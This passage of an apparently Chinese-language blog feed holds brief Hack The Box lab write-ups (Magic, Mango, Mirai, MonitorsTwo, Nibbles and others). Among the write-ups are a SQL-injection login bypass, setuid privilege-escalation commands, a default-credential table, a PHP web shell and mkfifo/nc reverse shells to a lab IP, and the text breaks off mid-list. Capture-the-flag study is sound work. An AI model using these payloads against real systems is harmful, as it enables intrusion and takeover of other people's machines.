+&lt;p&gt;查看可执行二进制文件中有&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;/bin/systemctl&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;GTFIBins查看提权&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo install -m =xs $(which systemctl) .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TF=$(mktemp).service
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo &amp;#39;[Service]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Type=oneshot
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ExecStart=/bin/sh -c &amp;#34;id &amp;gt; /tmp/output&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Install]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WantedBy=multi-user.target&amp;#39; &amp;gt; $TF
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./systemctl link $TF
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./systemctl enable --now $TF
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;TF=$(mktemp).service&lt;/p&gt;
+&lt;p&gt;echo &amp;lsquo;[Service]&lt;/p&gt;
+&lt;p&gt;Type=oneshot&lt;/p&gt;
+&lt;p&gt;ExecStart=/bin/sh -c &amp;ldquo;chmod +s /bin/bash&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;[Install]&lt;/p&gt;
+&lt;p&gt;WantedBy=multi-user.target&amp;rsquo; &amp;gt; 11.service&lt;/p&gt;
+&lt;p&gt;/bin/systemctl link $TF&lt;/p&gt;
+&lt;p&gt;/bin/systemctl enable &amp;ndash;now $TF&lt;/p&gt;
+&lt;p&gt;这里经实验只有/hoem/pepper主文件下的service文件才可以进行连接到&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;systemctl进行托管&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;而/tmp下的文件不行&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Magic</title>
+        <link>https://example.com/htb/magic/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/magic/</guid>
+        <description>&lt;h2 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h2&gt;&lt;p&gt;打开网页能看到一个登录接口&lt;/p&gt;
+&lt;p&gt;试一下万能密码admin&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&lt;/p&gt;
+&lt;p&gt;进去了然后是一个上传接口&lt;/p&gt;
+&lt;p&gt;有只限图片后缀的白名单&lt;/p&gt;
+&lt;p&gt;这样能绕过&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/magic/1732018009643-756529db-7951-458e-b54d-60c2222f404f.png&#34;
+	width=&#34;1365&#34;
+	height=&#34;766&#34;
+	srcset=&#34;https://example.com/htb/magic/1732018009643-756529db-7951-458e-b54d-60c2222f404f_huc5babe9a798f80e4335d25a263ef4230_138679_480x0_resize_box_3.png 480w, https://example.com/htb/magic/1732018009643-756529db-7951-458e-b54d-60c2222f404f_huc5babe9a798f80e4335d25a263ef4230_138679_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;178&#34;
+		data-flex-basis=&#34;427px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;拿到shell&lt;/p&gt;
+&lt;h2 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h2&gt;&lt;p&gt;找到数据库的账号密码&lt;/p&gt;
+&lt;p&gt;但是mysql不能连接&lt;/p&gt;
+&lt;p&gt;用&lt;strong&gt;mysqldump &amp;ndash;user=theseus &amp;ndash;password=iamkingtheseus &amp;ndash;host=localhost Magic&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;将数据都导出&lt;/p&gt;
+&lt;p&gt;拿到thesesu的密码&lt;/p&gt;
+&lt;p&gt;切换为thesesu用户&lt;/p&gt;
+&lt;p&gt;然后查找二进制文件&lt;/p&gt;
+&lt;p&gt;/bin/sysinfo是我们这个用户组的&lt;/p&gt;
+&lt;p&gt;读取这个文件得知这个文件调用了popen去打开一个fidsk系统文件&lt;/p&gt;
+&lt;p&gt;没有用绝对路径所以存在路径劫持&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/magic/1732018390833-399adb14-80b7-4a1a-8ec4-fee05a9d386d.png&#34;
+	width=&#34;997&#34;
+	height=&#34;903&#34;
+	srcset=&#34;https://example.com/htb/magic/1732018390833-399adb14-80b7-4a1a-8ec4-fee05a9d386d_hued111720f229279f041c7ca13d190b05_82280_480x0_resize_box_3.png 480w, https://example.com/htb/magic/1732018390833-399adb14-80b7-4a1a-8ec4-fee05a9d386d_hued111720f229279f041c7ca13d190b05_82280_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;110&#34;
+		data-flex-basis=&#34;264px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Mango</title>
+        <link>https://example.com/htb/mango/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/mango/</guid>
+        <description>&lt;p&gt;Java.type(&amp;lsquo;java.lang.Runtime&amp;rsquo;).getRuntime().exec(&amp;lsquo;cp /bin/sh /tmp/sh&amp;rsquo;).waitFor()&lt;/p&gt;
+&lt;p&gt;Java.type(&amp;lsquo;java.lang.Runtime&amp;rsquo;).getRuntime().exec(&amp;lsquo;chmod u+s /tmp/sh&amp;rsquo;).waitFor()&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>MetaTwo</title>
+        <link>https://example.com/htb/metatwo/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/metatwo/</guid>
+        <description>&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_45894840/article/details/127748459&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;HackTheBox MetaTwo 网站框架CVE获取用户shell和破解私钥提权_gpg2john-CSDN博客&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Mirai</title>
+        <link>https://example.com/htb/mirai/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/mirai/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口，22，53，80&lt;/p&gt;
+&lt;p&gt;80打开空白网页，目录扫到admin，发现是Pi-hole Version v3.1.4&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/mirai/1726209856436-6f379015-23a5-483e-b254-85dcbcda9ead.png&#34;
+	width=&#34;840&#34;
+	height=&#34;585&#34;
+	srcset=&#34;https://example.com/htb/mirai/1726209856436-6f379015-23a5-483e-b254-85dcbcda9ead_hu0038db16964c7f385534f0ccf3fe3bd7_114687_480x0_resize_box_3.png 480w, https://example.com/htb/mirai/1726209856436-6f379015-23a5-483e-b254-85dcbcda9ead_hu0038db16964c7f385534f0ccf3fe3bd7_114687_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;143&#34;
+		data-flex-basis=&#34;344px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;用默认的登录ssh&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Raspberry Pi Distributions&lt;/font&gt;&lt;/th&gt;
+&lt;th&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Username&lt;/font&gt;&lt;/th&gt;
+&lt;th&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Password&lt;/font&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Raspberry Pi OS&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;pi&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;raspberry&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;DietPi&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;root&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;dietpi&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Lakka Linux&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;root&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;root&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Kali Linux&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;root&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;toor&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;OpenELEC&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;root&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;openelec&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Arch Linux ARM&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;root&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;root&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Debian&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;pi&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;raspberry&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;LibreELEC&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;root&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;libreelec&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;OSMC&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;osmc&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;osmc&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;QtonPi&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;root&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;rootme&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Ubuntu Server&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;ubuntu&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;ubuntu&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;ROKOS&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;rokos&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;rokos&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;Retropie&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;pi&lt;/font&gt;&lt;/td&gt;
+&lt;td&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;raspberry&lt;/font&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;heading&#34;&gt;
+&lt;/h1&gt;&lt;p&gt;权限提升
+&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;sudo -l查看能全局root权限&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;直接sudo su升到root&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;拿root.txt文件返回说不存在了，但在usb中有备份&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;lsblk&lt;/strong&gt;查看usb数据发现挂在/media/usbstick文件中&lt;/p&gt;
+&lt;p&gt;进入查看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/mirai/1726211460323-6cb0a06e-e606-4be9-a3a6-cb6f5eedfed2.png&#34;
+	width=&#34;751&#34;
+	height=&#34;129&#34;
+	srcset=&#34;https://example.com/htb/mirai/1726211460323-6cb0a06e-e606-4be9-a3a6-cb6f5eedfed2_hu3368376607557609f72395ff9a002c20_61292_480x0_resize_box_3.png 480w, https://example.com/htb/mirai/1726211460323-6cb0a06e-e606-4be9-a3a6-cb6f5eedfed2_hu3368376607557609f72395ff9a002c20_61292_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;582&#34;
+		data-flex-basis=&#34;1397px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;又说被删了，让我们查看能不能恢复&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;strings /dev/sdb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;查看被删到的根标志&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/mirai/1726211510478-e90c0668-a70c-460f-bcb0-ba571cefbf79.png&#34;
+	width=&#34;1026&#34;
+	height=&#34;649&#34;
+	srcset=&#34;https://example.com/htb/mirai/1726211510478-e90c0668-a70c-460f-bcb0-ba571cefbf79_hue583b87499c86fcb6bee21eba6a3908e_164385_480x0_resize_box_3.png 480w, https://example.com/htb/mirai/1726211510478-e90c0668-a70c-460f-bcb0-ba571cefbf79_hue583b87499c86fcb6bee21eba6a3908e_164385_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;158&#34;
+		data-flex-basis=&#34;379px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>MonitorsTwo</title>
+        <link>https://example.com/htb/monitorstwo/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/monitorstwo/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫端口无发现，无域名，目录扫描&lt;/p&gt;
+&lt;p&gt;网页打开，得知是&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;cacti 1.2.22&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;用poc拿到shell&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;进入发现是docker&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;在这个docker中根目录有个root文件告诉我们如何查询数据库&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/monitorstwo/1729239793289-99220a31-6c45-4670-a878-29628afe5a9a.png&#34;
+	width=&#34;916&#34;
+	height=&#34;816&#34;
+	srcset=&#34;https://example.com/htb/monitorstwo/1729239793289-99220a31-6c45-4670-a878-29628afe5a9a_huf26a3dbbdf0d10ccca870e024ebc7251_178108_480x0_resize_box_3.png 480w, https://example.com/htb/monitorstwo/1729239793289-99220a31-6c45-4670-a878-29628afe5a9a_huf26a3dbbdf0d10ccca870e024ebc7251_178108_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;112&#34;
+		data-flex-basis=&#34;269px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;根据这个语法拿到用户名密码，爆破&lt;/p&gt;
+&lt;p&gt;ssh登录&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;sudo -l无发现&lt;/p&gt;
+&lt;p&gt;查看docker版本这个版本存在&lt;font style=&#34;color:rgb(240, 246, 252);background-color:rgb(13, 17, 23);&#34;&gt;CVE-2021-41091&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/monitorstwo/1729239909284-0e8b622d-3afc-4ce2-abd0-3b5eeac5ff7e.png&#34;
+	width=&#34;933&#34;
+	height=&#34;478&#34;
+	srcset=&#34;https://example.com/htb/monitorstwo/1729239909284-0e8b622d-3afc-4ce2-abd0-3b5eeac5ff7e_hua74eaa6ba961fdf5570a6a719951f850_67881_480x0_resize_box_3.png 480w, https://example.com/htb/monitorstwo/1729239909284-0e8b622d-3afc-4ce2-abd0-3b5eeac5ff7e_hua74eaa6ba961fdf5570a6a719951f850_67881_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;195&#34;
+		data-flex-basis=&#34;468px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在docker中有一个capsh文件能够执行一个root环境&lt;img src=&#34;https://example.com/htb/monitorstwo/1729239957147-093393b4-1a62-43d0-b0f4-d868d1f8b1c0.png&#34;
+	width=&#34;978&#34;
+	height=&#34;719&#34;
+	srcset=&#34;https://example.com/htb/monitorstwo/1729239957147-093393b4-1a62-43d0-b0f4-d868d1f8b1c0_hud79393c533f2fd1c3472d01612af96ea_40276_480x0_resize_box_3.png 480w, https://example.com/htb/monitorstwo/1729239957147-093393b4-1a62-43d0-b0f4-d868d1f8b1c0_hud79393c533f2fd1c3472d01612af96ea_40276_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;136&#34;
+		data-flex-basis=&#34;326px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后再这个环境中我们给/bin/bash权限&lt;/p&gt;
+&lt;p&gt;再在主机使用这个docker的bash就能用root权限&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Nibbles</title>
+        <link>https://example.com/htb/nibbles/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/nibbles/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口，只开了80&lt;/p&gt;
+&lt;p&gt;网页打开提示一个目录/nibbleblog进去后是个博客&lt;/p&gt;
+&lt;p&gt;扫目录扫到一个后台管理，admin.php&lt;/p&gt;
+&lt;p&gt;网上搜索默认密码&lt;/p&gt;
+&lt;p&gt;admin,binnles进去了&lt;/p&gt;
+&lt;p&gt;在一个image编辑能上传文件，上传一个php的shell（用php编写的网页）&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;&lt;?php system(&#34;bash -c &#39;sh -i &amp;&gt;/dev/tcp/10.10.16.29/80 0&gt;&amp;1&#39;&#34;);?&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;拿到shell&lt;/font&gt;&lt;/p&gt;
+&lt;h1 id=&#34;font-stylecolorrgb77-77-77权限提升font&#34;&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;权限提升&lt;/font&gt;
+&lt;/h1&gt;&lt;h2 id=&#34;font-stylecolorrgb77-77-77nibbler-rootfont&#34;&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;nibbler-&amp;gt;root&lt;/font&gt;
+&lt;/h2&gt;&lt;p&gt;sudo -l&lt;/p&gt;
+&lt;p&gt;知道有一个/home/nibbler/personal/stuff/monitor.sh文件能以root权限运行&lt;/p&gt;
+&lt;p&gt;想法是给这个sh文件增加我们自己的弹shell的代码&lt;/p&gt;
+&lt;p&gt;echo &amp;lsquo;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc 10.10.16.29 8443 &amp;gt; /tmp/f&amp;rsquo; | tee -a /home/nibbler/personal/stuff/monitor.sh&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;echo &#39;...&#39;&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt;: 输出包含在引号中的字符串。&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;rm /tmp/f;&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt;: 删除&lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;/tmp/f&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt;文件，如果它存在。&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;mkfifo /tmp/f;&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt;: 创建一个命名管道 &lt;/font&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;/tmp/f&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt;。&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc 10.10.14.7 8443 &amp;gt; /tmp/f&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt;:&lt;/font&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;font style=&#34;color:#000000;&#34;&gt;从 FIFO 读取数据并通过&lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;/bin/sh&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt;解释执行。&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:#000000;&#34;&gt;将标准错误重定向到标准输出（&lt;/font&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;2&amp;gt;&amp;amp;1&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt;），使得错误输出也能通过管道传递。&lt;/font&gt;&lt;/li&gt;
